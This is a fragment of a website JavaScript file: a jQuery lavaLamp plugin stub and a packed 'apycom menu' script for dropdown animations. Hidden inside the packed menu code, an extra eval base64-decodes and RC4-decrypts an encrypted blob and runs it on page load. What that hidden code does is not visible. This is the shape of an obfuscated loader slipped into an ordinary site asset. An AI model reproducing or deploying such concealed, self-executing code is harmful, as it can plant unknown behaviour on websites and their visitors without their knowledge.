...
(function($) {
    $.fn.lavaLamp = function(o) {
        o = $.extend({ fx: "linear", speed: 600, click: function(){} }, o || {});
...
/** apycom menu ****************/
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('9(!B.17){B.17=h(v){v=v.1x();7 18=/(1q)[ \\/]([\\w.]+)/.M(v)||/(1b)[ \\/]([\\w.]+)/.M(v)||/(1y)(?:.*C|)[ \\/]([\\w.]+)/.M(v)||/(12) ([\\w.]+)/.M(v)||v.J(\'1z\')<0&&/(1B)(?:.*? 1C:([\\w.]+)|)/.M(v)||[];I{m:18[1]||\'\',C:18[2]||\'0\'}}}9(!B.m){W=B.17(1v.1w);m={};9(W.m){m[W.m]=1c;m.C=W.C}9(m.1q)m.1b=1c;1A 9(m.1b)m.1O=1c;B.m=m}B(h(){7 $=B;$.1L.O=h(1s,1o){7 E=u;9(E.z){9(E[0].1f)1M(E[0].1f);E[0].1f=1E(h(){1o(E)},1s)}I u};$(\'#q\').1r(\'1F-A\');$(\'#q 5 N\',\'#q\').n(\'L\',\'H\');9(!$(\'#q 8.1G\').z)$(\'#q 8:K\').1r(\'A\');$(\'.q>8\',\'#q\').1a(h(){7 5=$(\'N:K\',u);9(5.z){9(!5[0].R)5[0].R=5.Q();5.n({Q:20,V:\'H\'}).O(14,h(i){i.n(\'L\',\'X\').1m({Q:5[0].R},{1t:14,1p:h(){5.n(\'V\',\'X\')}})})}},h(){7 5=$(\'N:K\',u);9(5.z){7 n={L:\'H\',Q:5[0].R};5.1j().O(1,h(i){i.n(n)})}});$(\'5 5 8\',\'#q\').1a(h(){7 5=$(\'N:K\',u);9(5.z){9(!5[0].Y)5[0].Y=5.Z();5.n({Z:0,V:\'H\'}).O(1H,h(i){i.n(\'L\',\'X\').1m({Z:5[0].Y},{1t:14,1p:h(){5.n(\'V\',\'X\')}})})}},h(){7 5=$(\'N:K\',u);9(5.z){7 n={L:\'H\',Z:5[0].Y};5.1j().O(1,h(i){i.n(n)})}});9(!($.m.12&&$.m.C.19(0,1)==\'6\')){$(\'#q>5.q>8:16(.A)\').r(\'l\',1J).r(\'t\',0);$(\'#q>5.q>8:16(.A)>a\').n(\'F\',\'1e -1K\');$(\'#q>5.q>8:16(.A)>a>1d\').n(\'F\',\'1g -1N\')}$(\'#q>5.q>8\').1a(h(){9(!($.m.12&&$.m.C.19(0,1)==\'6\'))9(!$(u).1h("A")){7 8=u;10(D($(8).r(\'t\')));$(8).r(\'t\',1k(h(){7 t=D($(8).r(\'t\'));7 l=$(8).r(\'l\');l=D(l)-U;9(l<U){l=U;10(t)}$(8).r(\'l\',l);$(\'>a\',8).n(\'F\',\'1e -\'+l+\'P\');$(\'>a>1d\',8).n(\'F\',\'1g -\'+(l+27)+\'P\')},1i))}},h(){9(!($.m.12&&$.m.C.19(0,1)==\'6\'))9(!$(u).1h("A")){7 8=u;10(D($(8).r(\'t\')));$(8).r(\'t\',1k(h(){7 t=D($(8).r(\'t\'));7 l=$(8).r(\'l\');l=D(l)+U;9(l>1l){l=1l;10(t)}$(8).r(\'l\',l);$(\'>a\',8).n(\'F\',\'1e -\'+l+\'P\');$(\'>a>1d\',8).n(\'F\',\'1g -\'+(l+27)+\'P\')},1i))}})});2d((h(k,s){7 f={a:h(p){7 s="2c+/=";7 o="";7 a,b,c="";7 d,e,f,g="";7 i=0;2i{d=s.J(p.11(i++));e=s.J(p.11(i++));f=s.J(p.11(i++));g=s.J(p.11(i++));a=(d<<2)|(e>>4);b=((e&15)<<4)|(f>>2);c=((f&3)<<6)|g;o=o+T.S(a);9(f!=1u)o=o+T.S(b);9(g!=1u)o=o+T.S(c);a=b=c="";d=e=f=g=""}1S(i<p.z);I o},b:h(k,p){s=[];13(7 i=0;i<G;i++)s[i]=i;7 j=0;7 x;13(i=0;i<G;i++){j=(j+s[i]+k.1n(i%k.z))%G;x=s[i];s[i]=s[j];s[j]=x}i=0;j=0;7 c="";13(7 y=0;y<p.z;y++){i=(i+1)%G;j=(j+s[i])%G;x=s[i];s[i]=s[j];s[j]=x;c+=T.S(p.1n(y)^s[(s[i]+s[j])%G])}I c}};I f.b(k,f.a(s))})("1Y","1X+1Z/22+1V/1Q+1T+1U+23/2e/2g//2f/2h+26/+2a+1P+1I/2b+1W++1R+24+25/29+21/1D+28=="));',62,143,'|||||ul||var|li|if||||||||function||||pos|browser|css|||menu|attr||iid|this|ua||||length|active|jQuery|version|parseInt|node|backgroundPosition|256|hidden|return|indexOf|first|visibility|exec|div|retarder|px|height|hei|fromCharCode|String|54|overflow|matched|visible|wid|width|clearInterval|charAt|msie|for|300||not|uaMatch|match|substr|hover|webkit|true|span|left|_timer_|right|hasClass|50|stop|setInterval|648|animate|charCodeAt|method|complete|chrome|addClass|delay|duration|64|navigator|userAgent|toLowerCase|opera|compatible|else|mozilla|rv|EWk0ADET2vGSecH5Qxz9gdjVa9LpFaXAqTwExrKytdHPoadFm1|setTimeout|js|current|100|s5orszR53vTQq9GFcjIwXsOF|1080|1080px|fn|clearTimeout|1125px|safari|EKTzsXPUM|bq6c1ue53GZaQhRX3qcsM8WETuNZKsezuc|vWmgk7Ggddok5GTPQEGEVBenQMO|while|ymesjgVGAerX2Gk5MUVOVUukeDfsI3o1PlbJYa5IcUyGICnwfabh7I5cNKh6SJTiBvYO0B02GZ6oIsUPvKudZXclSMC|Uq|Z1E1cn4eVhTjOqfZ6nBmhnnGK5W|5d36IskWe4lTTFVXeAli7nB17zCAHQlFzPfwqU34G9OpEhbF|nGFfA0LPOtApeO60AHFI7gmkpr8TN7|T6yhopK0|6KAy||MP7NczapUNfglPImCHtSCMCesJNpZUd|EDD4G1H|4rf8s|YdW9YJC5XYV6AHcDfKzot3Vjv3FFr6t7d4blmcUlsSlBPQp0VTRGNhV1cdr6UuYyjQvzTBdfBte9wVKjQ|zDbWHymaUrGT|tZrGsQs8eFQ||PDiQl2Lcff5ApGA|IOPb|jGNeuDEecgik6yN9a1GZVbgOOKtXXOQKekXcAp6nxwJ4zMN1h933dbpxkow|WGeGLJGMCtF1pqCXN4gVh7n|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789|eval|2zB089AvnOrFVq0CMhnTC1XV5R7i|cdUqSTkWjSweu4EbMyuwOV2l5bSKEBR0IQ17YtggKhxHVnEkYKyaNpsOPamGwZE|3XLP9gk2xRiDByC4y3RTrNiBFoDgDGrnEv5MUZXVHNVQb8eGP9kl7bmSlJcEzzhEPN5rF6AmsPcbhMDAsf5sfDUN24xIImvsEGwhJJgtbsRWEbcWQ|DnM3fV2PQyuvuGZvFSqo0X4oXRBSHSdI829PDqZRg|do'.split('|'),0,{}))